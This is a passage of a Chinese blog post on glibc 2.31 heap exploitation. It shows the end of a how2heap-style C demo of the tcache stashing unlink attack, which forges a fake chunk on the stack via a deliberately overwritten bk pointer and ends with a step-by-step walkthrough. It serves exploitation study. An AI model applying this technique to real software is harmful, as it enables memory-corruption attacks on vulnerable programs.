+    stack_var<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stack_var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You can see the value of fake_chunk->bk is:%p\n\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Also, let's see the initial value of stack_var[4]:%p\n\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we alloc 9 chunks with malloc.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">//now we malloc 9 chunks</span>
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        chunk_lis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token comment">//put 7 chunks into tcache</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Then we free 7 of them in order to put them into tcache. Carefully we didn't free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to a    nother will be merged into one after another malloc.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token function">free</span><span class="token punctuation">(</span>chunk_lis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">//last tcache bin</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>chunk_lis<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">//now they are put into unsorted bin</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>chunk_lis<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">free</span><span class="token punctuation">(</span>chunk_lis<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">//convert into small bin</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// size > 0x90</span>
+
+    <span class="token comment">//now 5 tcache bins</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we emulate a vulnerability that can overwrite the victim->bk pointer into fake_chunk addr: %p.\n\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">//change victim->bck</span>
+    <span class="token comment">/*VULNERABILITY*/</span>
+    chunk_lis<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">;</span>
+    <span class="token comment">/*VULNERABILITY*/</span>
+
+    <span class="token comment">//trigger the attack</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk wer    e linked into tcache bins.\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck->fd has been changed into a libc addr    : %p\n\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_var<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">//malloc and return our fake chunk on stack</span>
+    target <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"As you can see, next malloc(0x90) will return the region our fake chunk: %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">assert</span><span class="token punctuation">(</span>target <span class="token operator">==</span> <span class="token operator">&amp;</span>stack_var<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+
+
+
+<p>创建两个数组stack_var和chunk_lis&#x3D;&#x3D;》</p>
+<p>stack_var&#x3D;&#x3D;&gt;fake_chunk</p>
+<p>chunk_lis&#x3D;&#x3D;&gt;创建的堆块的malloc指针</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319204931587.png"></p>
+<p>在stack_var[3]中写入stack_var[2]的地址：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319205532181.png"></p>
+<p>创建9个0xa0的chunk，将malloc指针放在chunk_lis数组中：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319205711345.png"></p>
+<p>将chunk 3到chunk 8释放进tcache bin中：</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319205810822.png" style="zoom:67%;" />
+
+
+
+<p>先释放chunk1 ，再释放chunk0，最后释放chunk2&#x3D;&#x3D;》</p>
+<p>chunk1进入tcache中，填充到7个&#x3D;&#x3D;》（还有一个原因为接下来如果释放与chunk1相邻chunk将会触发合并）</p>
+<p>chunk 0和chunk 2进入unsorted bin&#x3D;&#x3D;》</p>
+<p>2-&gt;0-&gt;unsorted addr&#x3D;&#x3D;》</p>
+<img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319205955513.png" style="zoom:67%;" />
+
+
+
+<p>申请一个0xb0大小的chunk&#x3D;&#x3D;》遍历tcache bin中无符合条件的chunk&#x3D;&#x3D;》、</p>
+<p>遍历unsorted bin中无符合条件的chunk&#x3D;&#x3D;》从top_chunk中分配&#x3D;&#x3D;》</p>
+<p>将unsorted bin中的chunk放入small bin中&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319211053291.png"></p>
+<p>再申请两个0xa0大小的chunk&#x3D;&#x3D;》从tcache bin中获取chunk 1和chunk 8&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319211421034.png"></p>
+<p>将chunk 2的bk指针覆盖为stack_var的地址&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319211600709.png"></p>
+<p>&#x3D;&#x3D;》stack_var将作为chunk 2的后一个堆块</p>
+<p>使用calloc申请0xa0大小的chunk&#x3D;&#x3D;》calloc不从bin中国启用堆块，而是直接申请内存&#x3D;&#x3D;》</p>
+<p>tcache bin中没有满7个chunk&#x3D;&#x3D;》small bin中有0xa0大小的chunk&#x3D;&#x3D;》</p>
+<p>将small bin中0xa0大小的chunk反序挂入tcache bin中&#x3D;&#x3D;》</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319211922222.png"></p>
+<p>&#x3D;&#x3D;&#x3D;&#x3D;》再申请一个0xa0大小的chunk会将stack_var当作是一个堆块启用：</p>
+<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220319212056964.png"></p>
+<h2 id="总结：-5"><a href="#总结：-5" class="headerlink" title="总结："></a>总结：</h2><p>利用unlink与small bin向tcache bin中挂堆块的特点：</p>
+<p>注意unlink需要部署绕过条件</p>
+<p>程序中必须有calloc才能利用</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/03/18/House-Of-Einherjar/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-03-19 21:25:29
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/pwn-%E5%A0%86/" title="pwn_堆">
+                        #pwn_堆
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/03/20/AFL++-%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#How2heap-Glibc2-31"><span class="toc-text">How2heap Glibc2.31</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup-2-31"><span class="toc-text">fastbin_dup 2.31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-reverse-into-tcache-2-31"><span class="toc-text">fastbin_reverse_into_tcache 2.31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A-1"><span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#overlapping-chunks-2-31"><span class="toc-text">overlapping_chunks 2.31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A-2"><span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcahe-house-of-spirit-2-31"><span class="toc-text">tcahe_house_of_spirit 2.31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A-3"><span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-poisoning-2-31"><span class="toc-text">tcache_poisoning 2.31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A-4"><span class="toc-text">总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-stashing-unlink-attack-2-31"><span class="toc-text">tcache_stashing_unlink_attack 2.31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A-5"><span class="toc-text">总结：</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zh-Closure">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">Copyright © 2023 Closure</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zh-Closure">email | 765003952@qq.com</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+      
+      
+          本站访客数<span id="busuanzi_value_site_uv"></span>人
+        
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="可露希尔大涨价……">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + How2heap%20Glibc2.31 + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F03%2F19%2FHow2heap-Glibc2-31%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/03/19/How2heap-Glibc2-31/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
